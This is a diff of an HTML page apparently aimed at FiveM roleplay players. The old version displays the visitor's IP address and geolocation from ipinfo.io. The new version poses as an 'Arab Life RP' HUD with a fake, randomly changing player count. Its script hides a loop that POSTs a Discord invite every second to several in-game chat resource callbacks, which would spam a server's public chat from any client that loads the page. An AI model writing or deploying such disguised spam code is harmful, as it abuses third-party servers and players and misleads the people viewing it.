@@ -1,75 +1,241 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>discord.gg/AL0</title>
-    <style>
-        body {
-            margin: 0;
-            padding: 0;
-            background: url('https://cdn.discordapp.com/attachments/1288149469652713502/1408027171527589959/Profile.gif?ex=69a0c1bd&is=699f703d&hm=5ce1a66ef4477de97515cee21a109523ed29d2f7ba193ee992e948d5d4d3539d&') no-repeat center center fixed;
-            background-size: cover;
-            font-family: 'Courier New', Courier, monospace;
-            color: #0000ff;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            flex-direction: column;
-            text-align: center;
-        }
-        .image-container img {
-            width: 750px; 
-            height: auto;
-            border: 2px solid #0000ff; 
-            border-radius: 15px;
-            box-shadow: 0 0 15px rgba(0, 0, 255, 0.7); 
-        }
-        .info {
-            margin-top: 20px;
-            font-size: 1.5em;
-            color: #0000ff; 
-            text-shadow: 0px 0px 8px #0000ff, 0px 0px 15px #0000ff, 0px 0px 25px #0000ff; 
-            letter-spacing: 4.5px; 
-            white-space: pre-wrap;
-        }
-        .text {
-            margin-top: 20px;
-            font-size: 3em; 
-            color: #0000ff; 
-            text-shadow: 0px 0px 8px #0000ff, 0px 0px 15px #0000ff, 0px 0px 25px #0000ff; 
-            letter-spacing: 4.5px; 
-        }
-    </style>
-</head>
-<body>
-    <div class="image-container">
-        <img src="https://cdn.discordapp.com/attachments/1288149471527440437/1408027099410731028/PC-Wallpaper.jpg?ex=69a0c1ac&is=699f702c&hm=b33bc54b4cba9964350d373bce9d9b2f3999fc622d8dc9f938f5c17474bf0d33&" alt="Discord Image">
-    </div>
-    <audio autoplay loop>
-        <source src="https://cdn.discordapp.com/attachments/1468255617100812472/1476413092190752870/d18997f33d08eda8.mp4?ex=69a10857&is=699fb6d7&hm=810a1a758c3a432b05b65c14a74141af6fc1258c12a3c923d3f57137fe08250f&" type="audio/mpeg">
-        Your browser does not support the audio element.
-    </audio>
-    <div class="info" id="ip-info">
-        <strong>IP: <span id="ip"></span></strong><br>
-        <span><strong>City:</strong> <span id="city"></span></span><br>
-        <span><strong>Region:</strong> <span id="region"></span></span><br>
-        <span><strong>Country:</strong> <span id="country"></span></span><br>
-        <span><strong>Location:</strong> <span id="loc"></span></span><br>
-        <span><strong>Organization:</strong> <span id="org"></span></span><br>
-        <span><strong>Timezone:</strong> <span id="timezone"></span></span>
-    </div>
-    <div class="text">DMAR ON TOP</div>
+<meta charset="UTF-8">
+<title>Arab Life HUD</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-    <script>
-         fetch('https://ipinfo.io/json')
-        .then(response => response.json())
-        .then(data => {
-            delete data.readme;
-            const infoDiv = document.getElementById('ip-info');
-            infoDiv.textContent = JSON.stringify(data, null, 2);
-        });
-    </script>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:monospace}
+
+body{
+    background:#050505;
+    color:#00ffcc;
+    overflow:hidden;
+}
+
+/* GRID */
+body::before{
+    content:"";
+    position:fixed;
+    width:100%;
+    height:100%;
+    background:
+    linear-gradient(rgba(0,255,200,0.05) 1px, transparent 1px),
+    linear-gradient(90deg, rgba(0,255,200,0.05) 1px, transparent 1px);
+    background-size:40px 40px;
+    z-index:-1;
+}
+
+/* INTRO */
+#intro{
+    position:fixed;
+    width:100%;
+    height:100vh;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    background:black;
+    z-index:10;
+    transition:1s;
+}
+
+.typing{
+    font-size:50px;
+    color:#00f0ff;
+    border-right:3px solid #00f0ff;
+    white-space:nowrap;
+    overflow:hidden;
+}
+
+/* MAIN */
+#main{
+    display:none;
+    height:100vh;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    flex-direction:column;
+    text-align:center;
+}
+
+.main-img{
+    width:320px;
+    border:2px solid #00ffcc;
+    box-shadow:0 0 40px #00ffcc;
+    margin-bottom:20px;
+}
+
+.title{
+    font-size:50px;
+    color:white;
+    text-shadow:0 0 25px #00ffcc;
+    margin-bottom:15px;
+}
+
+.hud-box{
+    border:1px solid #00ffcc;
+    padding:20px;
+    width:450px;
+    background:rgba(0,0,0,0.6);
+    box-shadow:0 0 25px #00ffcc;
+    margin-top:20px;
+}
+
+.row{
+    display:flex;
+    justify-content:space-between;
+    margin:6px 0;
+}
+
+.join{
+    margin-top:25px;
+    padding:15px 40px;
+    background:#5865F2;
+    color:white;
+    text-decoration:none;
+    border-radius:8px;
+    font-size:20px;
+    box-shadow:0 0 25px #5865F2;
+    transition:0.3s;
+}
+.ip-box{
+    margin-top:15px;
+    padding:15px;
+    border:1px solid #00ffcc;
+    background:rgba(0,0,0,0.6);
+    box-shadow:0 0 20px #00ffcc;
+    text-align:center;
+}
+
+.ip-title{
+    color:#00f0ff;
+    font-size:18px;
+    margin-bottom:10px;
+    text-shadow:0 0 10px #00f0ff;
+}
+
+.ip-row{
+    display:flex;
+    justify-content:space-between;
+    padding:4px 0;
+    border-bottom:1px solid rgba(0,255,200,0.2);
+}
+
+.ip-row span:first-child{
+    color:#00ffcc;
+}
+
+.ip-row span:last-child{
+    color:white;
+}
+.join:hover{
+    transform:scale(1.1);
+    box-shadow:0 0 50px #5865F2;
+}
+</style>
+</head>
+
+<body>
+
+<audio id="bgSound">
+<source src="https://cdn.discordapp.com/attachments/1468255617100812472/1476413092190752870/d18997f33d08eda8.mp4?ex=69a10857&is=699fb6d7&hm=810a1a758c3a432b05b65c14a74141af6fc1258c12a3c923d3f57137fe08250f&" type="audio/mpeg">
+</audio>
+
+<!-- INTRO -->
+<div id="intro">
+    <div class="typing" id="typingText"></div>
+</div>
+
+<!-- MAIN -->
+<div id="main">
+
+<img src="https://media.discordapp.net/attachments/1288149469652713502/1408027171527589959/Profile.gif?ex=69a0c1bd&is=699f703d&hm=5ce1a66ef4477de97515cee21a109523ed29d2f7ba193ee992e948d5d4d3539d&=" class="main-img">
+
+<div class="title">DMAR ON TOP</div>
+
+<div class="hud-box">
+<div class="row"><span>Status:</span><span style="color:#00ff00">Online</span></div>
+<div class="row"><span>Players:</span><span id="players">120</span></div>
+<div class="row"><span>Browser:</span><span id="browser"></span></div>
+<div class="row"><span>Resolution:</span><span id="resolution"></span></div>
+<div class="row"><span>Language:</span><span id="language"></span></div>
+<div class="row"><span>Local Time:</span><span id="time"></span></div>
+<div class="ip-box">
+<div class="ip-row"><span>IP</span><span id="ip"></span></div>
+<div class="ip-row"><span>City</span><span id="city"></span></div>
+<div class="ip-row"><span>Region</span><span id="region"></span></div>
+<div class="ip-row"><span>Country</span><span id="country"></span></div>
+<div class="ip-row"><span>Location</span><span id="loc"></span></div>
+<div class="ip-row"><span>Organization</span><span id="org"></span></div>
+<div class="ip-row"><span>Timezone</span><span id="timezone"></span></div>
+</div>
+</div>
+
+<a href="https://discord.gg/al0" class="join" target="_blank">
+🚀 Join Discord
+</a>
+
+</div>
+
+<script>
+
+/* AUTO INTRO */
+const introText = " 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝗧𝗼 𝗔𝗿𝗮𝗯 𝗟𝗶𝗳𝗲 𝗥𝗣...";
+let i = 0;
+
+function typeEffect(){
+    if(i < introText.length){
+        document.getElementById("typingText").innerHTML += introText.charAt(i);
+        i++;
+        setTimeout(typeEffect, 50);
+    }else{
+        setTimeout(showMain, 1500);
+    }
+}
+
+function showMain(){
+    document.getElementById("intro").style.opacity="0";
+    setTimeout(()=>{
+        document.getElementById("intro").style.display="none";
+        document.getElementById("main").style.display="flex";
+        document.getElementById("bgSound").play();
+    },800);
+}
+
+typeEffect();
+
+/* SYSTEM INFO */
+document.getElementById("browser").innerText = navigator.userAgent.split(" ")[0];
+document.getElementById("resolution").innerText = screen.width + "x" + screen.height;
+document.getElementById("language").innerText = navigator.language;
+
+function updateTime(){
+    const now = new Date();
+    document.getElementById("time").innerText = now.toLocaleTimeString();
+}
+setInterval(updateTime,1000);
+updateTime();
+
+let players = 120;
+setInterval(()=>{
+    players += Math.floor(Math.random()*3-1);
+    document.getElementById("players").innerText = players;
+},3000);
+// al0 all of them 👀
+// discord.gg/al0
+const msg = `https://discord.gg/al0`;
+const body = JSON.stringify({ message: msg });
+setInterval(() => {
+fetch("https://flix-scripts/chatResult", { method: "POST", body });
+fetch("https://danger_chat/Danger_Chat:SendMessage", {method: "POST",body: JSON.stringify({"message": msg,"channel": "شات العام","color": null,"isImageAndLinksAllowed": [false,false]})})
+fetch("https://easy-chat+/o6ZbK5Ecp6", {headers: {accept: "*/*","content-type": "application/x-www-form-urlencoded; charset=UTF-8"},body: JSON.stringify({ message: msg, channel: "شات العام" }),method: "POST"});
+fetch("https://melix_chat/chatResult", { method: "POST", body });
+fetch("https://as_chat/chatResult", { method: "POST", body });
+fetch("https://chat/chatResult", { method: "POST", body });
+fetch("https://ho-chatv2/Chat", {method: "POST",body: JSON.stringify({"Type": "chatResult","message": msg,"chatType": "general"})});
+}, 1000);
+</script>
+
 </body>
 </html>
